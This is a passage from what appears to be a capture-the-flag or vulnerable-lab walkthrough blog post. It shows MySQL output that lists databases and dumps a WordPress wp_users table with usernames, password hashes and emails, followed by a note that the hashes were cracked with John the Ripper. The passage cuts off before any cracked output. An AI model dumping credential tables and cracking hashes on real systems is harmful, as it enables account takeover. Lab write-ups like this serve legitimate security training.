</span><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
</span><span class='line'><span class="p">|</span> Database           <span class="p">|</span>
</span><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
</span><span class='line'><span class="p">|</span> information_schema <span class="p">|</span>
</span><span class='line'><span class="p">|</span> loot               <span class="p">|</span>
</span><span class='line'><span class="p">|</span> mysql              <span class="p">|</span>
</span><span class='line'><span class="p">|</span> performance_schema <span class="p">|</span>
</span><span class='line'><span class="p">|</span> phpmyadmin         <span class="p">|</span>
</span><span class='line'><span class="p">|</span> proof              <span class="p">|</span>
</span><span class='line'><span class="p">|</span> sys                <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wordpress          <span class="p">|</span>
</span><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
</span><span class='line'><span class="m">8</span> rows in <span class="nb">set</span> <span class="o">(</span>0.02 sec<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;mysql&gt; use wordpress<span class="p">;</span>
</span><span class='line'>Reading table information <span class="k">for</span> completion of table and column names
</span><span class='line'>You can turn off this feature to get a quicker startup with -A&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Database changed
</span><span class='line'>mysql&gt; show tables<span class="p">;</span>
</span><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
</span><span class='line'><span class="p">|</span> Tables_in_wordpress   <span class="p">|</span>
</span><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
</span><span class='line'><span class="p">|</span> wp_commentmeta        <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_comments           <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_links              <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_options            <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_postmeta           <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_posts              <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_term_relationships <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_term_taxonomy      <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_terms              <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_usermeta           <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_users              <span class="p">|</span>
</span><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
</span><span class='line'><span class="m">11</span> rows in <span class="nb">set</span> <span class="o">(</span>0.01 sec<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;mysql&gt;
</span><span class='line'>mysql&gt; <span class="k">select</span> * from wp_users<span class="p">;</span>
</span><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
</span><span class='line'><span class="p">|</span> ID <span class="p">|</span> user_login <span class="p">|</span> user_pass                          <span class="p">|</span> user_nicename <span class="p">|</span> user_email            <span class="p">|</span> user_url         <span class="p">|</span> user_registered     <span class="p">|</span> user_activation_key <span class="p">|</span> user_status <span class="p">|</span> display_name    <span class="p">|</span>
</span><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
</span><span class='line'><span class="p">|</span>  <span class="m">1</span> <span class="p">|</span> John       <span class="p">|</span> <span class="nv">$P$B7889EMq</span>/erHIuZapMB8GEizebcIy9. <span class="p">|</span> john          <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#x61;&amp;#105;&amp;#108;&amp;#x74;&amp;#111;&amp;#x3a;&amp;#x6a;&amp;#x6f;&amp;#x68;&amp;#x6e;&amp;#64;&amp;#x72;&amp;#101;&amp;#x64;&amp;#46;&amp;#108;&amp;#x6f;&amp;#x63;&amp;#x61;&amp;#108;&amp;#x68;&amp;#111;&amp;#x73;&amp;#x74;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x6a;&amp;#111;&amp;#104;&amp;#x6e;&amp;#x40;&amp;#114;&amp;#x65;&amp;#100;&amp;#x2e;&amp;#x6c;&amp;#x6f;&amp;#x63;&amp;#x61;&amp;#x6c;&amp;#104;&amp;#111;&amp;#115;&amp;#116;&lt;/a&gt;    | &lt;a href=&quot;http://localhost&quot;&gt;http://localhost&lt;/a&gt; | 2016-06-03 23:18:47 |                     |           0 | John Smith      |</span>
</span><span class='line'><span class="p">|</span>  <span class="m">2</span> <span class="p">|</span> Elly       <span class="p">|</span> <span class="nv">$P$BlumbJRRBit7y50Y17</span>.UPJ/xEgv4my0 <span class="p">|</span> elly          <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#97;&amp;#x69;&amp;#x6c;&amp;#116;&amp;#111;&amp;#58;&amp;#x45;&amp;#108;&amp;#x6c;&amp;#x79;&amp;#x40;&amp;#x72;&amp;#101;&amp;#x64;&amp;#x2e;&amp;#x6c;&amp;#111;&amp;#99;&amp;#x61;&amp;#108;&amp;#x68;&amp;#111;&amp;#115;&amp;#116;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x45;&amp;#x6c;&amp;#108;&amp;#x79;&amp;#x40;&amp;#114;&amp;#101;&amp;#x64;&amp;#46;&amp;#108;&amp;#x6f;&amp;#99;&amp;#97;&amp;#108;&amp;#x68;&amp;#111;&amp;#x73;&amp;#116;&lt;/a&gt;    |                  | 2016-06-05 16:11:33 |                     |           0 | Elly Jones      |</span>
</span><span class='line'><span class="p">|</span>  <span class="m">3</span> <span class="p">|</span> Peter      <span class="p">|</span> <span class="nv">$P$BTzoYuAFiBA5ixX2njL0XcLzu67sGD0</span> <span class="p">|</span> peter         <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#x61;&amp;#105;&amp;#108;&amp;#116;&amp;#111;&amp;#58;&amp;#x70;&amp;#x65;&amp;#x74;&amp;#101;&amp;#x72;&amp;#x40;&amp;#x72;&amp;#101;&amp;#x64;&amp;#x2e;&amp;#x6c;&amp;#111;&amp;#x63;&amp;#97;&amp;#108;&amp;#x68;&amp;#x6f;&amp;#115;&amp;#116;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x70;&amp;#x65;&amp;#116;&amp;#101;&amp;#114;&amp;#x40;&amp;#x72;&amp;#101;&amp;#x64;&amp;#x2e;&amp;#108;&amp;#111;&amp;#x63;&amp;#x61;&amp;#x6c;&amp;#x68;&amp;#111;&amp;#x73;&amp;#116;&lt;/a&gt;   |                  | 2016-06-05 16:13:16 |                     |           0 | Peter Parker    |</span>
</span><span class='line'><span class="p">|</span>  <span class="m">4</span> <span class="p">|</span> barry      <span class="p">|</span> <span class="nv">$P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0</span> <span class="p">|</span> barry         <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#97;&amp;#x69;&amp;#x6c;&amp;#116;&amp;#x6f;&amp;#x3a;&amp;#98;&amp;#97;&amp;#114;&amp;#x72;&amp;#121;&amp;#x40;&amp;#114;&amp;#101;&amp;#x64;&amp;#46;&amp;#x6c;&amp;#111;&amp;#99;&amp;#x61;&amp;#108;&amp;#x68;&amp;#x6f;&amp;#x73;&amp;#116;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#98;&amp;#97;&amp;#x72;&amp;#x72;&amp;#121;&amp;#x40;&amp;#114;&amp;#101;&amp;#x64;&amp;#46;&amp;#x6c;&amp;#111;&amp;#x63;&amp;#x61;&amp;#x6c;&amp;#104;&amp;#111;&amp;#115;&amp;#116;&lt;/a&gt;   |                  | 2016-06-05 16:14:26 |                     |           0 | Barry Atkins    |</span>
</span><span class='line'><span class="p">|</span>  <span class="m">5</span> <span class="p">|</span> heather    <span class="p">|</span> <span class="nv">$P$Bwd0VpK8hX4aN</span>.rZ14WDdhEIGeJgf10 <span class="p">|</span> heather       <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#97;&amp;#x69;&amp;#108;&amp;#116;&amp;#x6f;&amp;#x3a;&amp;#104;&amp;#101;&amp;#97;&amp;#x74;&amp;#x68;&amp;#101;&amp;#x72;&amp;#64;&amp;#114;&amp;#101;&amp;#x64;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#x61;&amp;#x6c;&amp;#x68;&amp;#111;&amp;#115;&amp;#x74;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#104;&amp;#101;&amp;#97;&amp;#x74;&amp;#104;&amp;#x65;&amp;#x72;&amp;#x40;&amp;#114;&amp;#101;&amp;#x64;&amp;#x2e;&amp;#108;&amp;#x6f;&amp;#99;&amp;#97;&amp;#108;&amp;#104;&amp;#111;&amp;#115;&amp;#x74;&lt;/a&gt; |                  | 2016-06-05 16:18:04 |                     |           0 | Heather Neville |</span>
</span><span class='line'><span class="p">|</span>  <span class="m">6</span> <span class="p">|</span> garry      <span class="p">|</span> <span class="nv">$P$BzjfKAHd6N4cHKiugLX</span>.4aLes8PxnZ1 <span class="p">|</span> garry         <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#97;&amp;#105;&amp;#x6c;&amp;#x74;&amp;#x6f;&amp;#58;&amp;#103;&amp;#x61;&amp;#114;&amp;#114;&amp;#x79;&amp;#64;&amp;#x72;&amp;#101;&amp;#x64;&amp;#46;&amp;#x6c;&amp;#x6f;&amp;#99;&amp;#97;&amp;#108;&amp;#104;&amp;#x6f;&amp;#115;&amp;#x74;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#103;&amp;#97;&amp;#x72;&amp;#114;&amp;#121;&amp;#64;&amp;#x72;&amp;#101;&amp;#x64;&amp;#46;&amp;#x6c;&amp;#x6f;&amp;#99;&amp;#97;&amp;#x6c;&amp;#x68;&amp;#x6f;&amp;#x73;&amp;#116;&lt;/a&gt;   |                  | 2016-06-05 16:18:23 |                     |           0 | garry           |</span>
</span><span class='line'><span class="p">|</span>  <span class="m">7</span> <span class="p">|</span> harry      <span class="p">|</span> <span class="nv">$P$BqV</span>.SQ6OtKhVV7k7h1wqESkMh41buR0 <span class="p">|</span> harry         <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#97;&amp;#x69;&amp;#108;&amp;#116;&amp;#x6f;&amp;#x3a;&amp;#104;&amp;#97;&amp;#114;&amp;#x72;&amp;#x79;&amp;#64;&amp;#x72;&amp;#101;&amp;#x64;&amp;#x2e;&amp;#108;&amp;#111;&amp;#x63;&amp;#x61;&amp;#108;&amp;#104;&amp;#x6f;&amp;#x73;&amp;#116;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#104;&amp;#97;&amp;#114;&amp;#114;&amp;#121;&amp;#x40;&amp;#114;&amp;#x65;&amp;#100;&amp;#46;&amp;#x6c;&amp;#x6f;&amp;#x63;&amp;#x61;&amp;#x6c;&amp;#104;&amp;#111;&amp;#115;&amp;#x74;&lt;/a&gt;   |                  | 2016-06-05 16:18:41 |                     |           0 | harry           |</span>
</span><span class='line'><span class="p">|</span>  <span class="m">8</span> <span class="p">|</span> scott      <span class="p">|</span> <span class="nv">$P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1</span> <span class="p">|</span> scott         <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#x61;&amp;#x69;&amp;#x6c;&amp;#x74;&amp;#111;&amp;#58;&amp;#x73;&amp;#x63;&amp;#x6f;&amp;#116;&amp;#x74;&amp;#64;&amp;#114;&amp;#x65;&amp;#100;&amp;#x2e;&amp;#x6c;&amp;#111;&amp;#99;&amp;#x61;&amp;#x6c;&amp;#x68;&amp;#111;&amp;#115;&amp;#116;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x73;&amp;#99;&amp;#111;&amp;#x74;&amp;#x74;&amp;#x40;&amp;#114;&amp;#101;&amp;#100;&amp;#x2e;&amp;#x6c;&amp;#111;&amp;#x63;&amp;#97;&amp;#108;&amp;#x68;&amp;#x6f;&amp;#115;&amp;#116;&lt;/a&gt;   |                  | 2016-06-05 16:18:59 |                     |           0 | scott           |</span>
</span><span class='line'><span class="p">|</span>  <span class="m">9</span> <span class="p">|</span> kathy      <span class="p">|</span> <span class="nv">$P$BZlxAMnC6ON</span>.PYaurLGrhfBi6TjtcA0 <span class="p">|</span> kathy         <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#97;&amp;#x69;&amp;#108;&amp;#116;&amp;#x6f;&amp;#x3a;&amp;#x6b;&amp;#x61;&amp;#x74;&amp;#x68;&amp;#x79;&amp;#64;&amp;#x72;&amp;#101;&amp;#100;&amp;#x2e;&amp;#x6c;&amp;#111;&amp;#x63;&amp;#x61;&amp;#108;&amp;#104;&amp;#x6f;&amp;#x73;&amp;#116;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x6b;&amp;#97;&amp;#116;&amp;#x68;&amp;#121;&amp;#x40;&amp;#x72;&amp;#x65;&amp;#x64;&amp;#46;&amp;#x6c;&amp;#111;&amp;#x63;&amp;#97;&amp;#x6c;&amp;#x68;&amp;#x6f;&amp;#x73;&amp;#116;&lt;/a&gt;   |                  | 2016-06-05 16:19:14 |                     |           0 | kathy           |</span>
</span><span class='line'><span class="p">|</span> <span class="m">10</span> <span class="p">|</span> tim        <span class="p">|</span> <span class="nv">$P$BXDR7dLIJczwfuExJdpQqRsNf</span>.9ueN0 <span class="p">|</span> tim           <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#x61;&amp;#x69;&amp;#108;&amp;#116;&amp;#x6f;&amp;#x3a;&amp;#116;&amp;#x69;&amp;#x6d;&amp;#x40;&amp;#114;&amp;#101;&amp;#x64;&amp;#46;&amp;#108;&amp;#111;&amp;#x63;&amp;#x61;&amp;#x6c;&amp;#104;&amp;#x6f;&amp;#115;&amp;#116;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x74;&amp;#105;&amp;#x6d;&amp;#64;&amp;#114;&amp;#101;&amp;#100;&amp;#x2e;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#x6c;&amp;#x68;&amp;#111;&amp;#115;&amp;#116;&lt;/a&gt;     |                  | 2016-06-05 16:19:29 |                     |           0 | tim             |</span>
</span><span class='line'><span class="p">|</span> <span class="m">11</span> <span class="p">|</span> ZOE        <span class="p">|</span> <span class="nv">$P$B</span>.gMMKRP11QOdT5m1s9mstAUEDjagu1 <span class="p">|</span> zoe           <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#97;&amp;#x69;&amp;#108;&amp;#116;&amp;#x6f;&amp;#58;&amp;#x7a;&amp;#111;&amp;#101;&amp;#x40;&amp;#114;&amp;#101;&amp;#x64;&amp;#x2e;&amp;#x6c;&amp;#111;&amp;#x63;&amp;#x61;&amp;#x6c;&amp;#x68;&amp;#111;&amp;#x73;&amp;#x74;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#122;&amp;#x6f;&amp;#101;&amp;#64;&amp;#x72;&amp;#x65;&amp;#100;&amp;#46;&amp;#x6c;&amp;#x6f;&amp;#99;&amp;#97;&amp;#108;&amp;#x68;&amp;#x6f;&amp;#x73;&amp;#x74;&lt;/a&gt;     |                  | 2016-06-05 16:19:50 |                     |           0 | ZOE             |</span>
</span><span class='line'><span class="p">|</span> <span class="m">12</span> <span class="p">|</span> Dave       <span class="p">|</span> <span class="nv">$P$Bl7</span>/V9Lqvu37jJT.6t4KWmY.v907Hy. <span class="p">|</span> dave          <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#x61;&amp;#x69;&amp;#108;&amp;#116;&amp;#111;&amp;#x3a;&amp;#x64;&amp;#x61;&amp;#118;&amp;#101;&amp;#64;&amp;#x72;&amp;#101;&amp;#100;&amp;#46;&amp;#108;&amp;#111;&amp;#x63;&amp;#x61;&amp;#x6c;&amp;#x68;&amp;#x6f;&amp;#115;&amp;#x74;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x64;&amp;#x61;&amp;#118;&amp;#101;&amp;#64;&amp;#x72;&amp;#x65;&amp;#x64;&amp;#x2e;&amp;#108;&amp;#x6f;&amp;#x63;&amp;#x61;&amp;#108;&amp;#x68;&amp;#x6f;&amp;#115;&amp;#x74;&lt;/a&gt;    |                  | 2016-06-05 16:20:09 |                     |           0 | Dave            |</span>
</span><span class='line'><span class="p">|</span> <span class="m">13</span> <span class="p">|</span> Simon      <span class="p">|</span> <span class="nv">$P$BLxdiNNRP008kOQ</span>.jE44CjSK/7tEcz0 <span class="p">|</span> simon         <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#97;&amp;#x69;&amp;#108;&amp;#x74;&amp;#111;&amp;#x3a;&amp;#115;&amp;#x69;&amp;#109;&amp;#x6f;&amp;#x6e;&amp;#x40;&amp;#114;&amp;#101;&amp;#100;&amp;#x2e;&amp;#108;&amp;#x6f;&amp;#99;&amp;#x61;&amp;#108;&amp;#104;&amp;#111;&amp;#115;&amp;#x74;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#115;&amp;#x69;&amp;#109;&amp;#x6f;&amp;#110;&amp;#64;&amp;#x72;&amp;#x65;&amp;#100;&amp;#46;&amp;#x6c;&amp;#x6f;&amp;#x63;&amp;#97;&amp;#x6c;&amp;#104;&amp;#111;&amp;#x73;&amp;#x74;&lt;/a&gt;   |                  | 2016-06-05 16:20:35 |                     |           0 | Simon           |</span>
</span><span class='line'><span class="p">|</span> <span class="m">14</span> <span class="p">|</span> Abby       <span class="p">|</span> <span class="nv">$P$ByZg5mTBpKiLZ5KxhhRe</span>/uqR.48ofs. <span class="p">|</span> abby          <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#x61;&amp;#105;&amp;#x6c;&amp;#116;&amp;#111;&amp;#58;&amp;#x61;&amp;#x62;&amp;#x62;&amp;#x79;&amp;#64;&amp;#x72;&amp;#101;&amp;#x64;&amp;#46;&amp;#108;&amp;#x6f;&amp;#99;&amp;#x61;&amp;#108;&amp;#104;&amp;#x6f;&amp;#x73;&amp;#x74;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x61;&amp;#x62;&amp;#98;&amp;#x79;&amp;#64;&amp;#x72;&amp;#101;&amp;#x64;&amp;#x2e;&amp;#x6c;&amp;#x6f;&amp;#x63;&amp;#x61;&amp;#108;&amp;#104;&amp;#111;&amp;#x73;&amp;#x74;&lt;/a&gt;    |                  | 2016-06-05 16:20:53 |                     |           0 | Abby            |</span>
</span><span class='line'><span class="p">|</span> <span class="m">15</span> <span class="p">|</span> Vicki      <span class="p">|</span> <span class="nv">$P$B85lqQ1Wwl2SqcPOuKDvxaSwodTY131</span> <span class="p">|</span> vicki         <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#x61;&amp;#105;&amp;#108;&amp;#x74;&amp;#x6f;&amp;#58;&amp;#x76;&amp;#x69;&amp;#x63;&amp;#107;&amp;#x69;&amp;#64;&amp;#x72;&amp;#101;&amp;#100;&amp;#x2e;&amp;#108;&amp;#x6f;&amp;#x63;&amp;#x61;&amp;#108;&amp;#104;&amp;#111;&amp;#115;&amp;#x74;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x76;&amp;#105;&amp;#99;&amp;#107;&amp;#x69;&amp;#64;&amp;#114;&amp;#x65;&amp;#100;&amp;#x2e;&amp;#x6c;&amp;#x6f;&amp;#99;&amp;#97;&amp;#108;&amp;#104;&amp;#x6f;&amp;#115;&amp;#116;&lt;/a&gt;   |                  | 2016-06-05 16:21:14 |                     |           0 | Vicki           |</span>
</span><span class='line'><span class="p">|</span> <span class="m">16</span> <span class="p">|</span> Pam        <span class="p">|</span> <span class="nv">$P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0</span> <span class="p">|</span> pam           <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#x61;&amp;#x69;&amp;#x6c;&amp;#116;&amp;#111;&amp;#58;&amp;#x70;&amp;#97;&amp;#x6d;&amp;#x40;&amp;#x72;&amp;#101;&amp;#x64;&amp;#x2e;&amp;#108;&amp;#x6f;&amp;#x63;&amp;#97;&amp;#108;&amp;#104;&amp;#111;&amp;#x73;&amp;#x74;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#112;&amp;#97;&amp;#x6d;&amp;#x40;&amp;#x72;&amp;#x65;&amp;#x64;&amp;#x2e;&amp;#108;&amp;#111;&amp;#99;&amp;#x61;&amp;#108;&amp;#x68;&amp;#111;&amp;#115;&amp;#116;&lt;/a&gt;     |                  | 2016-06-05 16:42:23 |                     |           0 | Pam             |</span>
</span><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
</span><span class='line'><span class="m">16</span> rows in <span class="nb">set</span> <span class="o">(</span>0.01 sec<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;mysql&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>Then I use <code>john the ripper</code> to crack those hahses and got the following cracked:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
